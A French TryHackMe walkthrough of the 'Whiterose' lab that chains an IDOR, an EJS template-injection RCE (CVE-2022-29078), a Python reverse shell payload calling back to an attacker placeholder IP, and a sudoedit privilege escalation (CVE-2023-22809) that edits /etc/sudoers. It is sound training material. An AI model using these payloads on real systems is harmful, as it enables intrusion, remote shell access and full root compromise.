**Whiterose — Walkthrough TryHackMe**  
**Room :** Whiterose  
**Lien :** https://tryhackme.com/room/whiterose  
**Difficulté :** Facile  
**Description :**  
Yet another Mr. Robot themed challenge.

# Objectifs pédagogiques
Cette room permet de travailler plusieurs notions clés en pentest :
- Énumération de services réseau
- Exploitation d’une IDOR
- Exploitation SSTI (EJS) → RCE Node.js
- Élévation de privilèges via sudoedit (CVE)


⚠️ Ce walkthrough est fourni à des fins éducatives uniquement.
N’effectuez jamais ces techniques sur des systèmes sans autorisation explicite.

# Résumé exécutif

Ce rapport présente l’exploitation complète de la room Whiterose sur TryHackMe.  
L’objectif est de démontrer une chaîne d’attaque réaliste, depuis une surface web exposée
jusqu’à une compromission totale du système.

Chaîne d’exploitation :  
IDOR → compromission compte admin → SSTI EJS → RCE → élévation de privilèges Linux.

Public visé : Pentester junior / Blue team / Développeur backend.

# Outils utilisés
- Nmap
- Gobuster
- Burp Suite
- Netcat
- Python
- sudo

# 1. Reconnaissance (Recon)

Après avoir lancé la machine cible et connecté notre VM au réseau TryHackMe via OpenVPN, nous commençons par une phase de reconnaissance avec Nmap.  

### Objectif  
Identifier la surface d’attaque :
- ports ouverts
- services exposés
- système d’exploitation

### Scan réseau : 
```bash
nmap -A -p- -T4 IP_CIBLE
```

### Explication des options
- A : mode agressif (OS detection, traceroute, scripts avancés)
- -p- : scan de tous les ports (1–65535)
- T4 : accélère le scan
- IP_CIBLE : adresse IP de la machine cible

![image](https://github.com/user-attachments/assets/6f175acf-1064-4fba-8dec-4ef9ee972cd2)

### Analyse des services exposés
Ports ouverts :
| Port    | Service   | Intérêt |
|---------|-----------|---------|
| 22      | SSH       | Accès distant (post-exploitation) |
| 80     | HTTP   | Site web nginx 1.14.0 potentiellement vulnérable |

### Accès au site

L’accès au site redirige vers `cyprusbank.thm`. 

➡️ Ajout dans /etc/hosts :  
`<IP_CIBLE> cyprusbank.thm`


Le site affiche une page de maintenance.
![image](https://github.com/user-attachments/assets/b5138eab-3ff2-4da3-b4bf-76b9c35f9e3e)

Analyse rapide côté client:
- Aucun script JavaScript
- Aucun commentaire HTML
- Pas de page robots.txt
- Peu de ressources chargées
- Aucun résultat avec une énumération gobuster

➡️ Hypothèse : présence d’un sous-domaine non exposé

# 2. Énumération

### Recherche de Vhosts

![image](https://github.com/user-attachments/assets/a3968b74-90c4-4fa5-8e24-3e210ca359f4)

Une énumération des virtual hosts révèle :  
`admin.cyprusbank.thm`

➡️ Ajout dans /etc/hosts puis navigation vers le sous-domaine : 
`<IP_CIBLE> cyprusbank.thm admin.cyprusbank.thm`

# 3. Accès à l’interface d’administration

Le sous-domaine admin.cyprusbank.thm expose une page de connexion.

![image](https://github.com/user-attachments/assets/b4c265e3-cdf4-499e-95bd-ed4e43cbc23d)

Le challenge met à notre disposition des identifiants `Olivia Cortez : olivi8` fournis que nous pouvons utiliser pour se connecter.

La connexion au site est réussie, mais nous avons un accès limité puisque l'endpoint /settings est interdit pour l'utilisateur Olivia Cortez.

![image](https://github.com/user-attachments/assets/9ff1c639-4c06-4f7a-a766-c5745ea205c7)

# 4. IDOR – Accès à des données sensibles

En se rendant sur l'endpoint /messages `/messages/?c=5`, on peut observer qu'il y a un paramètre `c` dans l'url. Ce paramètre est contrôlé côté client.

### Test Insecure Direct Object Reference (IDOR)
Essayons de changer la valeur du paramètre `c` afin de potiellement révéler des informations dont nous ne disposons pas initialement  :  `/messages/?c=20`

![image](https://github.com/user-attachments/assets/58700f39-3a1c-4d07-a361-1ebd86364d0f)

➡️ Résultat :
Accès à davantage de messages

Cette manipulation révèle une divulgation d’identifiants sensibles : `Gayle Bev : REDACTED`

**Impact sécurité :**  
Cette vulnérabilité permet à un utilisateur authentifié d’accéder à des ressources ne lui appartenant pas,
entraînant une fuite d’informations sensibles et facilitant la compromission de comptes à privilèges élevés.

# 5. Compte administrateur & surface d’attaque élargie

À ce stade, nous disposons d’un accès administrateur à l’application web, ce qui élargit considérablement la surface d’attaque côté serveur.

On a maintenant accès à l’endpoint /settings et il devient possible de modifier les mots de passe des utilisateurs.

Les mots de passe sont réinjectés côté serveur dans la réponse HTML.  

![image](https://github.com/user-attachments/assets/8469acb1-dd86-441b-807c-0183bded15f0)

➡️ Indice fort de SSTI (rendu serveur)

# 6. Server-Side Template Injection (SSTI)

A l'aide de l'outil Burp Suite, on peut intercepter une requête de modification de mot de passe.

![image](https://github.com/user-attachments/assets/edacb276-9c6d-4cbf-99d3-4f95f873bd86)

### Analyse de l’erreur serveur

En supprimant le paramètre `password`, l’application retourne une stack trace complète.

![image](https://github.com/user-attachments/assets/38d92b8e-ac37-4116-876d-28deec32b163)


``` text
HTTP/1.1 500 Internal Server Error  
Server: nginx/1.14.0 (Ubuntu)  
Date: Sat, 03 Jan 2026 14:06:54 GMT  
Content-Type: text/html; charset=utf-8  
Content-Length: 1632  
Connection: keep-alive  
X-Powered-By: Express  
Content-Security-Policy: default-src 'none'  
X-Content-Type-Options: nosniff  

ReferenceError: /home/web/app/views/settings.ejs:14
  12| <div class="alert alert-info mb-3"><%= message %></div>
  13| <% } %>
>>14| <% if (password != -1) { %>
  15| <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
  16| <% } %>
  17| <% if (typeof error != 'undefined') { %>

password is not defined
  at eval ("/home/web/app/views/settings.ejs":27:8)
  at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
  at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
  at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
  at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
  at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
  at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
  at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
  at /home/web/app/routes/settings.js:27:7
  at runMicrotasks (<anonymous>)
```

Informations critiques divulguées :
- Backend : Node.js / Express
- Template engine : EJS
- Chemins internes exposés

➡️ Confirmation d’un bug applicatif exploitable

# 7. Validation de la SSTI → RCE (CVE-2022-29078)

De nombreuses ressources sur Internet parlent de la CVE-2022-29078 permettant d'obtenir une exécution de code arbitraire à partir d'une vulnérabilité SSTI :
- https://github.com/mde/ejs/issues/720
- https://eslam.io/posts/ejs-server-side-template-injection-rce/

Payload de test SSTI (via Burp Suite) :

``` text
settings[view options][outputFunctionName]=x;
process.mainModule.require('child_process')
.execSync('whoami');
s
```

![image](https://github.com/user-attachments/assets/9a31ed45-006d-4180-af08-688cc6c392ad)

➡️ Callback reçu  
✅ Exécution de commandes confirmée

**Impact sécurité :**  
La vulnérabilité SSTI permet à un attaquant authentifié d’exécuter du code arbitraire côté serveur, aboutissant à une compromission complète de l’application et du système sous-jacent.

# 8. Obtention d’un reverse shell

La SSTI EJS confirmée permettant l’exécution de commandes arbitraires, il est possible d’invoquer directement Python afin d’établir un reverse shell vers la machine attaquante, sans déposer de fichier sur la cible.

### Payload utilisé

``` text
settings[view options][outputFunctionName]=x;
process.mainModule.require('child_process')
.execSync(
"python3 -c 'import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((\"IP_ATTAQUANT\", 1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn(\"sh\")'"
);
```
Le reverse shell est exécuté directement via Python,
sans téléchargement ni écriture de fichier sur la machine cible, afin de réduire les traces laissées sur le système.

Ce payload ouvre une connexion TCP vers la machine attaquante, redirige les entrées/sorties standard vers le socket, puis ouvre un shell interactif via `pty`, assurant une session stable.

➡️ Shell obtenu 

![image](https://github.com/user-attachments/assets/e862b1c2-9371-43c6-8add-33cc70ba0e8d)

 
➡️ Stabilisation du shell 

![image](https://github.com/user-attachments/assets/ef5be721-2c95-4cc9-89c3-b5b04de621e9)

**Impact sécurité :**  
L’exécution de commandes arbitraires permet à un attaquant d’obtenir un accès interactif au système,
ouvrant la voie au vol de données, à l’installation de portes dérobées et à une élévation de privilèges.

# 9. Accès utilisateur & flag user

Utilisateur courant : web

Flag trouvé dans le répertoire `/home/web/user.txt`

![image](https://github.com/user-attachments/assets/7fe17284-4f45-4755-9b8a-1ba85dd74e56)

# 10. Élévation de privilèges – sudoedit (CVE-2023-22809)

### Analyse sudo
La commande `sudo -l` liste tout ce que l’utilisateur web peut exécuter avec sudo. 

![image](https://github.com/user-attachments/assets/549edde0-3acd-4571-ae35-6f200a31c15f)

### Résultat :
L’utilisateur web peut modifier un fichier de configuration Nginx en tant que root, sans mot de passe.

Version sudo : 1.9.12p1  
➡️ Version vulnérable à CVE-2023-22809

# 11. Exploitation de sudoedit (sudo -e)

### Principe
sudoedit permet d’injecter des arguments via la variable EDITOR.

Essentiellement, sudoedit permet aux utilisateurs de choisir leur éditeur à l'aide de variables d'environnement telles que SUDO_EDITOR, VISUAL ou EDITOR. Étant donné que les valeurs de ces variables peuvent être non seulement l'éditeur lui-même, mais aussi les arguments à passer à l'éditeur choisi, sudo utilise -- lors de leur analyse pour séparer l'éditeur et ses arguments des fichiers à ouvrir pour modification.

Cela signifie qu'en utilisant l'argument -- dans les variables d'environnement de l'éditeur, nous pouvons le forcer à ouvrir d'autres fichiers que ceux autorisés dans la commande sudoedit que nous pouvons exécuter. Par conséquent, comme nous pouvons exécuter sudoedit en tant que root avec sudo, nous pouvons modifier n'importe quel fichier que nous voulons en tant que root.

Pour utiliser cette vulnérabilité à des fins d'élévation de privilèges, nous pouvons écrire dans de nombreux fichiers. Dans ce cas, nous pouvons simplement choisir d'écrire dans le fichier /etc/sudoers pour nous accorder tous les privilèges sudo.

Plus d'informations détaillées à ce sujet dans cet avis de sécurité publié par Synacktiv (https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)

### Exploitation

``` bash
export EDITOR="nano -- /etc/sudoers"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Le fichier `/etc/sudoers` s'ouvre avec nano.

En ajoutant `web ALL=(ALL) NOPASSWD: ALL` au fichier, nous pouvons accorder à notre utilisateur actuel tous les privilèges sudo.

![image](https://github.com/user-attachments/assets/36834f4c-cb6c-482a-ab68-5c0862ba3af7)

**Impact sécurité :**  
La mauvaise configuration de sudo, combinée à une version vulnérable, permet une élévation de privilèges locale menant à un accès root complet sur la machine.

# 12. Accès root

Après avoir enregistré le fichier, nous pouvons voir les modifications apportées à nos privilèges sudo.

![image](https://github.com/user-attachments/assets/866d94a7-3c15-449f-97c3-66dbcbd26b2a)


Enfin, en exécutant simplement sudo `sudo su -`, nous pouvons obtenir un shell en tant qu'utilisateur root et lire le drapeau root dans /root/root.txt.

![image](https://github.com/user-attachments/assets/0eee1307-7369-41f4-a04f-4c64d06162a4)

➡️ Accès root obtenu  
➡️ Flag : /root/root.txt

# Conclusion & compétences démontrées

### Vulnérabilités exploitées
- IDOR
- SSTI (EJS) → RCE (CVE-2022-29078)
- Mauvaise configuration sudo
- CVE-2023-22809 (sudoedit)

### Compétences mises en avant
- Méthodologie pentest
- Web exploitation
- Lecture de stack trace
- Exploitation Node.js / EJS
- Privilege escalation Linux